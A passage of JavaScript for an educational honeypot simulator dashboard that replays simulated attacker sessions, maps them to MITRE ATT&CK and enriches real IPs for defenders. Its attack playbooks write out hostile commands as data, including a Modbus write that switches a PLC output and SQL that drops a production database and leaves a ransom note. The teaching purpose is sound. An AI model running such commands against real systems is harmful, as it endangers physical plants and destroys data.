    { name: "ICS / Modbus probe", sensors: ["modbus"], steps: [["modbus: read coils addr=0 count=8", "Reads outputs of a (fake) PLC to learn what it controls.", "T1595"], ["modbus: read holding registers addr=0 count=10", "Reads configuration values like setpoints and counters.", "T1082"], ["modbus: write coil addr=3 value=ON", "Attempts to switch a physical output. On a real plant this could be dangerous.", "T0855"]], kill: 3, tags: ["SCADA"] },
    { name: "Database ransom scout", sensors: ["mysql", "mqtt"], steps: [["SELECT @@version; SHOW DATABASES;", "Fingerprints the server and lists databases.", "T1082"], ["SELECT * FROM users LIMIT 10;", "Samples sensitive tables.", "T1083"], ["DROP DATABASE prod; CREATE TABLE README_TO_RECOVER", "Wipes data and leaves a ransom note: the 'meow' / 'database ransom' pattern.", "T1496"]], kill: 4, tags: ["ransom"] }
];
const KILL = ["Recon", "Brute-force", "Access", "Discovery", "Payload", "Persistence", "Cover tracks"];
const S = { sessions: [], ips: new Set(), creds: 0, cmds: 0, mal: 0, users: {}, pass: {}, svc: {}, cc: {}, tech: {}, hourly: Array.from({ length: 24 }, () => ri(8, 40)), ioc: [], sel: null, replayTok: 0, paused: false };

function mkSession() {
    const pb = pick(PLAYBOOKS), sid = pick(pb.sensors), sensor = SENSORS.find(s => s[1] === sid) || SENSORS[0], c = pickCountry();
    const ip = pick(["203.0.113.", "198.51.100.", "192.0.2."]) + ri(2, 250), mal = pick(["203.0.113.", "198.51.100."]) + ri(2, 250), key = hex(12);
    const user = pick(USERS), pw = pick(PASSW), tries = ri(3, 28), ok = ["ssh", "telnet", "mysql", "mqtt", "rdp"].includes(sid) ? Math.random() < 0.8 : true;
    const steps = pb.steps.map(([cmd, note, t]) => [cmd.replace("{MAL}", mal).replace("{KEY}", key), note, t]);
    return { id: hex(6), ts: Date.now(), sensor, proto: sid, ip, cc: c[0], country: c[1], user, pw, tries, ok, tool: pick(TOOLS), pb, steps, mal, hash: hex(64), key, dur: ri(4, 160) };
}
function register(s, live = true) {
    S.sessions.unshift(s); if (S.sessions.length > 60) S.sessions.pop();
    S.ips.add(s.ip); S.creds += s.tries; S.cmds += s.steps.length; if (s.steps.some(x => x[2] === "T1105")) S.mal++;
    S.users[s.user] = (S.users[s.user] || 0) + s.tries; S.pass[s.pw] = (S.pass[s.pw] || 0) + s.tries; S.svc[s.sensor[0]] = (S.svc[s.sensor[0]] || 0) + 1; S.cc[s.cc] = (S.cc[s.cc] || 0) + 1;
    new Set(s.steps.map(x => x[2])).forEach(t => S.tech[t] = (S.tech[t] || 0) + 1); S.tech.T1110 = (S.tech.T1110 || 0) + 1;
    S.hourly[23] += 1; if (live) { addIoc("ipv4-addr", s.ip, "sim", s.pb.name + " via " + s.sensor[0]); if (s.steps.some(x => x[2] === "T1105")) addIoc("ipv4-addr", s.mal, "sim", "malware host (documentation range)"); }
}
function addIoc(type, value, src, note) { if (S.ioc.some(i => i.value === value)) return; S.ioc.unshift({ type, value, src, note, ts: Date.now() }); if (S.ioc.length > 80) S.ioc.pop(); const c = $("#hp6IocCount"); if (c) c.textContent = S.ioc.length; }

/* ---------- build ---------- */
function build() {
    mount.innerHTML = `
    <div class="hp6">
        <div class="hp6-head"><div><small>COMMAND CENTER <em class="t-sim">SIM</em></small><h3>🛰️ Honeypot Command Center</h3><p>Watch simulated attackers hit eight decoy sensors in real time. Click any session to replay exactly what the attacker typed, with analyst notes and MITRE ATT&amp;CK mapping. Use the <b>real</b> IP enrichment tool below to investigate any public address.</p></div>
        <div class="hp6-btns"><button type="button" id="hp6Pause">⏸ Pause stream</button><button type="button" id="hp6Reset">↺ Reset counters</button></div></div>
        <div class="hp6-kpis" id="hp6Kpis"></div>
        <div class="hp6-cols">
            <div class="hp6-card hp6-sessions"><div class="hp6-ch"><h4>🔴 Live attacker sessions</h4><small>click a row to replay</small></div><div class="hp6-table" id="hp6Table"></div></div>
            <div class="hp6-card hp6-replay" id="hp6Replay"><div class="hp6-empty">👈 Select a session to see its kill chain, the exact commands typed and what each one means.</div></div>
        </div>
        <div class="hp6-grid">
            <div class="hp6-card"><h4>🔑 Most-tried usernames</h4><div id="hp6Users"></div></div>
            <div class="hp6-card"><h4>🔐 Most-tried passwords</h4><div id="hp6Pass"></div><p class="hp6-note">Attackers try the same weak defaults everywhere: this is why unique passwords matter.</p></div>
            <div class="hp6-card"><h4>🎯 Services attacked</h4><div id="hp6Svc"></div></div>
            <div class="hp6-card"><h4>🌍 Attack origins</h4><div id="hp6Cc"></div><p class="hp6-note">Origin = last hop, often a rented server or hacked device, not the attacker's home.</p></div>
        </div>
        <div class="hp6-card"><div class="hp6-ch"><h4>🧭 MITRE ATT&amp;CK techniques observed</h4><small>glowing = seen this session</small></div><div class="hp6-mitre" id="hp6Mitre"></div></div>
        <div class="hp6-card"><div class="hp6-ch"><h4>📈 Attacks per hour (last 24 h)</h4><small>simulated baseline + live sessions</small></div><div class="hp6-spark" id="hp6Spark"></div></div>
        <div class="hp6-cols hp6-tools">
            <div class="hp6-card"><div class="hp6-ch"><h4>🔎 Enrich any IP <em class="t-live">REAL</em></h4><small>ipwho.is · Shodan InternetDB · RDAP</small></div>
                <form class="hp6-form" id="hp6EnForm"><input id="hp6EnIp" type="text" placeholder="Public IP, e.g. 8.8.8.8" autocomplete="off" inputmode="decimal"><button type="submit">Investigate</button></form><div id="hp6EnOut" class="hp6-enout"><small>Enter a public IPv4/IPv6 address. Private and documentation addresses cannot be located.</small></div></div>
            <div class="hp6-card"><div class="hp6-ch"><h4>📦 Indicators of Compromise <em class="t-sim">SIM+REAL</em></h4><small><b id="hp6IocCount">0</b> collected</small></div>
                <div class="hp6-ioclist" id="hp6IocList"></div>
                <div class="hp6-iocbtns"><button type="button" id="hp6Json">⬇ STIX-lite JSON</button><button type="button" id="hp6Csv">⬇ CSV</button><button type="button" id="hp6Copy">⧉ Copy IPs</button></div>
                <p class="hp6-note">Simulated indicators use documentation IP ranges (203.0.113.0/24, 198.51.100.0/24, 192.0.2.0/24). Real indicators come only from IPs you investigate.</p></div>
        </div>
        <div class="hp6-edu">
            <div class="hp6-card"><h4>📘 What is a honeypot?</h4><p>A honeypot is a <b>decoy system</b> that looks vulnerable but holds nothing valuable. Because no real user should ever touch it, <b>every connection is suspicious</b>. Defenders use honeypots to detect attacks early, learn attacker tools and collect indicators to block.</p></div>
            <div class="hp6-card"><h4>⚙️ Interaction levels</h4><div class="hp6-mini"><div><b>Low</b><span>Emulates a few services. Safe, easy, limited detail (Honeyd, simple listeners).</span></div><div><b>Medium</b><span>Emulates a convincing shell or protocol (Cowrie, Dionaea, Conpot). Best learning value.</span></div><div><b>High</b><span>A real, isolated system. Richest data but risky if the attacker escapes.</span></div></div></div>
            <div class="hp6-card"><h4>🛠️ Run your own Cowrie (SSH honeypot)</h4><pre>docker run -d --name cowrie -p 2222:2222 cowrie/cowrie:latest
# move your REAL ssh to another port first, then:
sudo iptables -t nat -A PREROUTING -p tcp --dport 22 -j REDIRECT --to-port 2222
docker logs -f cowrie</pre><p class="hp6-note">Run it on an isolated cloud VM, never on your office or home network. Cowrie logs login attempts, commands and downloaded files.</p></div>
            <div class="hp6-card"><h4>🛡️ What defenders do with this data</h4><ul class="hp6-ul"><li>Block attacker IPs and malware hosts at the firewall.</li><li>Disable SSH password login, use keys + fail2ban.</li><li>Remove default accounts (root/admin/pi) and default passwords.</li><li>Patch exposed services and close unneeded ports.</li><li>Feed indicators into SIEM / threat-intel platforms.</li></ul></div>
            <div class="hp6-card hp6-legal"><h4>⚖️ Ethics &amp; legal</h4><p>Only deploy honeypots on infrastructure you own. Never "hack back" or scan systems you do not own. Check data-retention and privacy rules before storing attacker data.</p></div>
        </div>
    </div>`;
    $("#hp6Pause").onclick = e => { S.paused = !S.paused; e.target.textContent = S.paused ? "▶ Resume stream" : "⏸ Pause stream"; };
    $("#hp6Reset").onclick = () => { S.sessions = []; S.ips.clear(); S.creds = S.cmds = S.mal = 0; S.users = {}; S.pass = {}; S.svc = {}; S.cc = {}; S.tech = {}; S.hourly = Array.from({ length: 24 }, () => ri(8, 40)); renderAll(); };
    $("#hp6Table").onclick = e => { const r = e.target.closest("[data-id]"); if (r) replay(S.sessions.find(s => s.id === r.dataset.id)); };
    $("#hp6EnForm").onsubmit = e => { e.preventDefault(); enrich($("#hp6EnIp").value.trim()); };
    $("#hp6Json").onclick = () => download("cyberguard-iocs.json", JSON.stringify(stix(), null, 2), "application/json");
    $("#hp6Csv").onclick = () => download("cyberguard-iocs.csv", "type,value,source,note,time\n" + S.ioc.map(i => [i.type, i.value, i.src, `"${i.note.replace(/"/g, "'")}"`, new Date(i.ts).toISOString()].join(",")).join("\n"), "text/csv");
    $("#hp6Copy").onclick = e => { const t = S.ioc.map(i => i.value).join("\n"); (navigator.clipboard ? navigator.clipboard.writeText(t) : Promise.reject()).then(() => { e.target.textContent = "✓ Copied"; setTimeout(() => (e.target.textContent = "⧉ Copy IPs"), 1500); }).catch(() => { }); };
}
const uuid = () => (crypto.randomUUID ? crypto.randomUUID() : [hex(8), hex(4), "4" + hex(3), "a" + hex(3), hex(12)].join("-"));
function stix() { const now = new Date().toISOString(); return { type: "bundle", id: "bundle--" + uuid(), objects: S.ioc.map(i => ({ type: "indicator", spec_version: "2.1", id: "indicator--" + uuid(), created: now, modified: now, name: `${i.src === "real" ? "Investigated" : "Simulated"} ${i.type}: ${i.value}`, description: i.note, pattern: `[${i.type}:value = '${i.value}']`, pattern_type: "stix", valid_from: new Date(i.ts).toISOString(), labels: [i.src === "real" ? "investigated" : "simulation"] })) }; }
function download(name, text, mime) { const a = document.createElement("a"); a.href = URL.createObjectURL(new Blob([text], { type: mime })); a.download = name; document.body.appendChild(a); a.click(); setTimeout(() => { URL.revokeObjectURL(a.href); a.remove(); }, 500); }

/* ---------- render ---------- */
const bars = (obj, n, cls, fmt) => { const e = Object.entries(obj).sort((a, b) => b[1] - a[1]).slice(0, n), m = Math.max(1, ...e.map(x => x[1])); return e.length ? e.map(([k, v]) => `<div class="hp6-bar"><span>${fmt ? fmt(k) : esc(k)}</span><i class="${cls}" style="--w:${Math.round(v / m * 100)}%"></i><em>${num(v)}</em></div>`).join("") : "<small>waiting for data…</small>"; };
function renderKpis() {
    const topT = Object.entries(S.tech).sort((a, b) => b[1] - a[1])[0];
    const t = (ic, l, v, s) => `<div class="hp6-kpi"><span>${ic}</span><small>${l}</small><b>${v}</b><u>${s}</u></div>`;
    $("#hp6Kpis").innerHTML = t("🪤", "Sessions captured", num(S.sessions.length + 0), "this page visit (SIM)") + t("🌐", "Unique attacker IPs", num(S.ips.size), "documentation ranges") + t("🔑", "Credentials tried", num(S.creds), "username/password pairs") + t("⌨️", "Commands captured", num(S.cmds), "typed into fake shells") + t("🦠", "Malware downloads", num(S.mal), "payload URLs seen") + t("🧭", "Top technique", topT ? `<span class="t-sm">${topT[0]}</span>` : "—", topT ? esc(MITRE[topT[0]][1]) : "");
}
function renderTable() {
    $("#hp6Table").innerHTML = `<div class="hp6-th"><span>Time</span><span>Sensor</span><span>Source</span><span>Login tried</span><span>Playbook</span></div>` + S.sessions.slice(0, 14).map(s => `<div class="hp6-tr${S.sel === s.id ? " on" : ""}" data-id="${s.id}"><span>${new Date(s.ts).toISOString().slice(11, 19)}</span><span>${esc(s.sensor[0])}<small>:${s.sensor[2]}</small></span><span>${flag(s.cc)} <code>${s.ip}</code></span><span><code>${esc(s.user)}</code>/<code>${esc(s.pw)}</code> ${s.ok ? '<em class="ok">GOT IN</em>' : '<em class="no">BLOCKED</em>'}</span><span>${esc(s.pb.name)}</span></div>`).join("");
}
function renderSide() {
    $("#hp6Users").innerHTML = bars(S.users, 7, "u"); $("#hp6Pass").innerHTML = bars(S.pass, 7, "p"); $("#hp6Svc").innerHTML = bars(S.svc, 8, "s"); $("#hp6Cc").innerHTML = bars(S.cc, 7, "c", k => `${flag(k)} ${esc((COUNTRIES.find(c => c[0] === k) || [0, k])[1])}`);
    const mx = Math.max(1, ...S.hourly); $("#hp6Spark").innerHTML = S.hourly.map((v, i) => `<i style="--h:${Math.max(5, Math.round(v / mx * 100))}%" title="${23 - i} h ago: ${v} attacks"></i>`).join("");
    const byT = {}; Object.keys(S.tech).forEach(k => { const m = MITRE[k]; if (m) (byT[m[0]] = byT[m[0]] || []).push(k); });
    $("#hp6Mitre").innerHTML = TACTICS.map(t => { const all = Object.entries(MITRE).filter(([, m]) => m[0] === t); return `<div class="hp6-tac"><b>${esc(t)}</b>${all.map(([k, m]) => `<span class="${S.tech[k] ? "hit" : ""}" title="${esc(m[1])}">${k}<small>${esc(m[1])}</small>${S.tech[k] ? `<em>${S.tech[k]}</em>` : ""}</span>`).join("")}</div>`; }).join("");
    $("#hp6IocList").innerHTML = S.ioc.slice(0, 8).map(i => `<div class="hp6-ioc"><code>${esc(i.value)}</code><span class="${i.src === "real" ? "real" : "sim"}">${i.src.toUpperCase()}</span><small>${esc(i.note)}</small></div>`).join("") || "<small>No indicators yet.</small>";
}
function renderAll() { renderKpis(); renderTable(); renderSide(); }

/* ---------- replay ---------- */
async function replay(s) {
    if (!s) return; S.sel = s.id; renderTable(); const tok = ++S.replayTok, box = $("#hp6Replay"), fast = tier() === "low";
    const reached = s.pb.kill;
    box.innerHTML = `<div class="hp6-ch"><h4>🎬 Session replay · ${esc(s.pb.name)}</h4><small>${esc(s.sensor[0])} · ${flag(s.cc)} ${esc(s.country)} · ${s.dur}s</small></div>
        <div class="hp6-meta"><span>🔧 Tool: <b>${esc(s.tool)}</b></span><span>🔑 ${s.tries} login tries</span><span>${s.ok ? "✅ attacker got in (fake shell)" : "⛔ blocked at login"}</span>${s.pb.tags.map(t => `<span class="tag">${esc(t)}</span>`).join("")}</div>
        <div class="hp6-kill">${KILL.map((k, i) => `<div class="${i < reached ? "on" : ""}"><i>${i + 1}</i><span>${k}</span></div>`).join("")}</div>
        <div class="hp6-term" id="hp6Term"><div class="hp6-tl dim">[${new Date(s.ts).toISOString().slice(11, 19)}] ${esc(s.sensor[0])}: connection from ${s.ip} (${esc(s.country)})</div><div class="hp6-tl dim">[auth] ${s.tries} attempts, last: ${esc(s.user)} / ${esc(s.pw)} → ${s.ok ? "<b class=\"ok\">ACCEPTED</b> (decoy)" : "<b class=\"no\">REJECTED</b>"}</div></div>
        <div class="hp6-notes" id="hp6Notes"></div><div class="hp6-iocs" id="hp6SessIoc"></div>`;
    const term = $("#hp6Term"), notes = $("#hp6Notes");
    if (s.ok || s.proto === "smb" || s.proto === "http" || s.proto === "modbus") {
        for (const [cmd, note, t] of s.steps) {
            if (tok !== S.replayTok) return;
            const line = document.createElement("div"); line.className = "hp6-tl"; line.innerHTML = `<span class="p">${s.proto === "http" ? "&gt;" : s.proto === "mysql" ? "mysql&gt;" : "root@decoy:~#"}</span> <span class="c"></span><i class="cur"></i>`; term.appendChild(line);
            const c = line.querySelector(".c"); if (fast) c.textContent = cmd; else for (const ch of cmd) { if (tok !== S.replayTok) return; c.textContent += ch; await sleep(rnd(8, 28)); }
            line.querySelector(".cur").remove(); term.scrollTop = term.scrollHeight;
            const m = MITRE[t] || ["", ""]; const n = document.createElement("div"); n.className = "hp6-note2"; n.innerHTML = `<b>${esc(cmd.length > 46 ? cmd.slice(0, 46) + "…" : cmd)}</b><p>${esc(note)}</p><em>${t} · ${esc(m[0])} → ${esc(m[1])}</em>`; notes.appendChild(n);
            if (!fast) await sleep(rnd(260, 620));
        }
    } else notes.innerHTML = `<div class="hp6-note2"><b>Blocked at login</b><p>The decoy refused the credentials, so the attacker never reached a shell. Brute-force bots log thousands of attempts like this every day.</p><em>T1110 · Credential Access → Brute Force</em></div>`;
    $("#hp6SessIoc").innerHTML = `<h5>📦 Indicators from this session</h5><div><code>${s.ip}</code> attacker IP</div>${s.steps.some(x => x[2] === "T1105") ? `<div><code>${s.mal}</code> malware host</div><div><code>sha256:${s.hash.slice(0, 32)}…</code> payload hash (simulated)</div>` : ""}${s.steps.some(x => x[2] === "T1098") ? `<div><code>ssh-rsa …${s.key}</code> attacker public key</div>` : ""}<h5>🛡️ Defender actions</h5><ul><li>Block <code>${s.ip}</code> and any malware host above.</li><li>${s.proto === "ssh" || s.proto === "telnet" ? "Disable password login and default accounts; use SSH keys + fail2ban." : s.proto === "smb" ? "Patch Windows, disable SMBv1 and never expose port 445." : s.proto === "http" ? "Patch the app, update WAF rules and validate input." : s.proto === "modbus" ? "Keep ICS networks off the internet; use VPN and allow-lists." : "Restrict the service to private networks and require authentication."}</li></ul>`;
    addIoc("ipv4-addr", s.ip, "sim", "replayed session: " + s.pb.name);
}

/* ---------- REAL enrichment ---------- */
async function gj(url, ms = 10000) { const c = new AbortController(), t = setTimeout(() => c.abort(), ms); try { const r = await fetch(url, { signal: c.signal }); if (!r.ok) { const e = new Error("HTTP " + r.status); e.status = r.status; throw e; } return await r.json(); } finally { clearTimeout(t); } }
const isV4 = s => /^(?:(?:25[0-5]|2[0-4]\d|1?\d?\d)\.){3}(?:25[0-5]|2[0-4]\d|1?\d?\d)$/.test(s), isV6 = s => s.includes(":") && /^[0-9a-f:.]+$/i.test(s);
const PORTN = { 21: "FTP", 22: "SSH", 23: "Telnet", 25: "SMTP", 53: "DNS", 80: "HTTP", 110: "POP3", 143: "IMAP", 443: "HTTPS", 445: "SMB", 502: "Modbus", 1433: "MSSQL", 1883: "MQTT", 3306: "MySQL", 3389: "RDP", 5432: "PostgreSQL", 5900: "VNC", 6379: "Redis", 8080: "HTTP-alt", 9200: "Elasticsearch", 27017: "MongoDB" };
const RISKY = new Set([21, 23, 445, 502, 1433, 1883, 3306, 3389, 5900, 6379, 9200, 27017]);
async function enrich(ip) {
    const out = $("#hp6EnOut");
    if (!isV4(ip) && !isV6(ip)) { out.innerHTML = `<div class="hp6-err">Enter a valid public IPv4 or IPv6 address.</div>`; return; }
    if (/^(10\.|127\.|192\.168\.|169\.254\.|0\.|172\.(1[6-9]|2\d|3[01])\.|192\.0\.2\.|198\.51\.100\.|203\.0\.113\.)/.test(ip) || /^(::1|f[cd]|fe[89ab])/i.test(ip)) { out.innerHTML = `<div class="hp6-err">That is a private, loopback or documentation address (our simulated attackers use these). Try a real public IP such as <code>8.8.8.8</code>.</div>`; return; }
    out.innerHTML = `<div class="hp6-busy"><i></i> Investigating ${esc(ip)}…</div>`;
    const [g, d, r] = await Promise.allSettled([gj(`https://ipwho.is/${encodeURIComponent(ip)}`).then(x => { if (x.success === false) throw new Error(x.message); return x; }), gj(`https://internetdb.shodan.io/${encodeURIComponent(ip)}`).catch(e => { if (e.status === 404) return { notFound: true, ports: [], vulns: [], tags: [], hostnames: [] }; throw e; }), gj(`https://rdap.org/ip/${encodeURIComponent(ip)}`)]);
    if (g.status !== "fulfilled" && d.status !== "fulfilled") { out.innerHTML = `<div class="hp6-err">Could not reach the intelligence services (offline or rate-limited). Try again shortly.</div>`; return; }
    const G = g.status === "fulfilled" ? g.value : null, D = d.status === "fulfilled" ? d.value : null, R = r.status === "fulfilled" ? r.value : null;
    const ports = D && !D.notFound ? D.ports : [], cves = D ? D.vulns || [] : [], tags = D ? D.tags || [] : [], org = G && G.connection ? (G.connection.org || G.connection.isp || "") : "";
    const risky = ports.filter(p => RISKY.has(p)), host = /(amazon|google|microsoft|digitalocean|ovh|hetzner|linode|vultr|cloud|hosting|server|vps|m247|contabo)/i.test(org), vpn = /(vpn|proxy|tor |nord|mullvad|proton)/i.test(org);
    const ents = []; (function f(a) { (a || []).forEach(e => { ents.push(e); f(e.entities); }); })(R && R.entities); const ab = ents.find(e => (e.roles || []).includes("abuse")), email = ab && ab.vcardArray && (ab.vcardArray[1].find(v => v[0] === "email") || [])[3];
    let sc = Math.min(30, cves.length * 4) + Math.min(24, risky.length * 8) + (tags.some(t => /malware|c2|botnet|compromised|scanner|tor/i.test(t)) ? 30 : 0) + (vpn ? 8 : 0) + (host ? 4 : 0); sc = Math.min(100, sc);
    const lv = sc >= 55 ? ["HIGH SUSPICION", "bad"] : sc >= 20 ? ["WORTH WATCHING", "warn"] : ["NO STRONG SIGNALS", "ok"];
    out.innerHTML = `<div class="hp6-en hp6-en-${lv[1]}"><div class="hp6-env"><b>${flag(G && G.country_code)} ${esc(ip)}</b><span>${lv[0]} · ${sc}/100</span></div>
        <div class="hp6-engrid"><div><small>Location</small>${esc(G ? `${G.city || "—"}, ${G.region || "—"}, ${G.country || "—"}` : "—")}</div><div><small>Network</small>${esc(org || "—")} ${G && G.connection && G.connection.asn ? `<code>AS${esc(G.connection.asn)}</code>` : ""}</div><div><small>Type</small>${vpn ? "VPN / proxy" : host ? "Hosting / data centre" : "Likely ISP / business"}</div><div><small>IP block</small>${esc(R && R.name || "—")}</div><div><small>Abuse contact</small>${email ? `<code>${esc(email)}</code>` : "—"}</div><div><small>Hostnames</small>${D && D.hostnames && D.hostnames.length ? esc(D.hostnames.slice(0, 2).join(", ")) : "—"}</div></div>
        ${ports.length ? `<div class="hp6-chips">${ports.slice(0, 12).map(p => `<span class="${RISKY.has(p) ? "r" : ""}">${p}${PORTN[p] ? " " + PORTN[p] : ""}</span>`).join("")}</div>` : `<small>${D && D.notFound ? "Not in Shodan's index (no open services observed)." : "No open-port data."}</small>`}
        ${cves.length ? `<div class="hp6-chips cve">${cves.slice(0, 8).map(c => `<a href="https://nvd.nist.gov/vuln/detail/${esc(c)}" target="_blank" rel="noopener noreferrer">${esc(c)}</a>`).join("")}</div>` : ""}${tags.length ? `<div class="hp6-chips tg">${tags.map(t => `<span>${esc(t)}</span>`).join("")}</div>` : ""}
        <p class="hp6-note">Public intelligence only. A clean result is not proof an IP is safe. Do not scan or attack addresses you do not own.</p></div>`;
    addIoc(isV6(ip) ? "ipv6-addr" : "ipv4-addr", ip, "real", `investigated · ${org || "unknown network"}${sc >= 20 ? " · suspicion " + sc : ""}`); renderSide();
}

/* ---------- boot ---------- */
function init() {
    build(); for (let i = 0; i < 6; i++) { const s = mkSession(); s.ts -= i * 7000; register(s, true); } renderAll();
    const tick = () => { if (!S.paused && !document.hidden) { register(mkSession(), true); renderKpis(); renderTable(); renderSide(); } setTimeout(tick, tier() === "low" ? 6000 : tier() === "medium" ? 3500 : 2400); }; setTimeout(tick, 2400);
}
if (document.readyState === "loading") document.addEventListener("DOMContentLoaded", init); else init();
window.CG_HP6 = { state: S, PLAYBOOKS, MITRE };
})();